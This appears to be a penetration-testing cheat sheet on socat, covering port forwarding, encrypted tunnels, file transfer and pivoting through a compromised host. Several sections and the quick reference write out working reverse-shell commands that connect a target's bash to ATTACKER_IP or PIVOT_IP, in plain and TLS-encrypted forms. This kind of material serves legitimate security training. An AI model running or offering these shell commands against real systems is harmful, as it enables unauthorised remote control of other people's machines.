# Socat Pivoting Guide

## What is Socat?

Socat (SOcket CAT) is a multipurpose relay tool. Think of it as netcat on steroids - it can create bidirectional data streams between almost any type of data channel.

---

## Installation

```bash
# Linux
apt install socat

# Compile static binary (for transfers)
wget https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat
chmod +x socat
```

---

## Simple Port Forwarding

### Forward Local Port to Remote Host

```bash
# Forward localhost:8080 to 192.168.1.100:80
socat TCP-LISTEN:8080,fork TCP:192.168.1.100:80

# With reuseaddr (reuse port)
socat TCP-LISTEN:8080,fork,reuseaddr TCP:192.168.1.100:80
```

### Expose Service on All Interfaces

```bash
# Listen on all interfaces
socat TCP-LISTEN:8080,fork,bind=0.0.0.0 TCP:192.168.1.100:80
```

---

## Reverse Shell Relay

### Scenario

```
Target → Pivot (socat) → Attacker (nc listener)
```

### Setup

```bash
# On attacker - start listener
nc -lvnp 4444

# On pivot - relay to attacker
socat TCP-LISTEN:5555,fork TCP:ATTACKER_IP:4444

# On target - connect to pivot
nc PIVOT_IP 5555 -e /bin/bash
# Or: bash -i >& /dev/tcp/PIVOT_IP/5555 0>&1
```

---

## Encrypted Tunnel with SSL

### Generate Certificate

```bash
# Generate self-signed certificate
openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out cert.pem
cat key.pem cert.pem > combined.pem
```

### Encrypted Listener

```bash
# On pivot - encrypted listener forwarding to target
socat OPENSSL-LISTEN:443,cert=combined.pem,verify=0,fork TCP:192.168.1.100:80

# On attacker - connect with SSL
socat TCP-LISTEN:8080,fork OPENSSL:PIVOT_IP:443,verify=0

# Access via localhost:8080
```

### Encrypted Reverse Shell

```bash
# On attacker - listener
socat OPENSSL-LISTEN:443,cert=combined.pem,verify=0 file:`tty`,raw,echo=0

# On target - connect
socat OPENSSL:ATTACKER_IP:443,verify=0 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
```

---

## Fully Interactive TTY Shell

### On Attacker

```bash
# Listen with TTY
socat file:`tty`,raw,echo=0 TCP-LISTEN:4444
```

### On Target

```bash
# Connect with PTY
socat TCP:ATTACKER_IP:4444 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane

# Or with sh
socat TCP:ATTACKER_IP:4444 EXEC:'bash -li',pty,stderr,setsid,sigint,sane
```

---

## UDP Relay

```bash
# Forward UDP
socat UDP-LISTEN:53,fork UDP:DNS_SERVER:53

# UDP to TCP conversion
socat UDP-LISTEN:53,fork TCP:DNS_SERVER:53
```

---

## File Transfer

### Send File

```bash
# On receiver
socat TCP-LISTEN:4444,fork file:received_file,create

# On sender
socat TCP:RECEIVER_IP:4444 file:file_to_send
```

### With Progress

```bash
# Sender with verbose
socat -d -d TCP:RECEIVER_IP:4444 file:file_to_send
```

---

## Multiple Port Forwards

Socat handles one connection at a time. For multiple forwards, run multiple instances:

```bash
# Forward RDP
socat TCP-LISTEN:3389,fork TCP:192.168.1.100:3389 &

# Forward SSH
socat TCP-LISTEN:2222,fork TCP:192.168.1.100:22 &

# Forward HTTP
socat TCP-LISTEN:8080,fork TCP:192.168.1.100:80 &
```

---

## Common Options

| Option | Description |
|--------|-------------|
| `fork` | Handle multiple connections |
| `reuseaddr` | Reuse socket address |
| `bind=IP` | Bind to specific interface |
| `pty` | Allocate pseudo-terminal |
| `stderr` | Redirect stderr |
| `setsid` | Create new session |
| `sigint` | Handle Ctrl+C |
| `sane` | Set terminal to sane state |
| `verify=0` | Skip SSL verification |

---

## Troubleshooting

### Connection Refused

```bash
# Check if socat is listening
netstat -tlnp | grep socat
ss -tlnp | grep socat

# Run with debug
socat -d -d TCP-LISTEN:8080,fork TCP:target:80
```

### "Address already in use"

```bash
# Use reuseaddr
socat TCP-LISTEN:8080,fork,reuseaddr TCP:target:80

# Or kill existing process
fuser -k 8080/tcp
```

### SSL Issues

```bash
# Generate new certificate
openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out cert.pem -subj '/CN=localhost'
cat key.pem cert.pem > combined.pem

# Use verify=0 on both sides
socat OPENSSL-LISTEN:443,cert=combined.pem,verify=0,fork ...
socat ... OPENSSL:host:443,verify=0
```

---

## Comparison: Socat vs Netcat

| Feature | Socat | Netcat |
|---------|-------|--------|
| Port forwarding | Built-in | Requires pipes |
| SSL/TLS | Built-in | Ncat only |
| PTY shells | Built-in | No |
| UDP | Yes | Yes |
| Multiple connections | fork option | Limited |
| Complexity | Higher | Lower |

---

## Quick Reference

```bash
# Port forward
socat TCP-LISTEN:LOCAL_PORT,fork TCP:TARGET:PORT

# Reverse shell relay
socat TCP-LISTEN:5555,fork TCP:ATTACKER:4444

# Encrypted tunnel
socat OPENSSL-LISTEN:443,cert=cert.pem,verify=0,fork TCP:TARGET:80

# Interactive shell listener
socat file:`tty`,raw,echo=0 TCP-LISTEN:4444

# Interactive shell client
socat TCP:IP:4444 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane

# File transfer (receiver)
socat TCP-LISTEN:4444,fork file:output,create

# File transfer (sender)
socat TCP:IP:4444 file:input
```



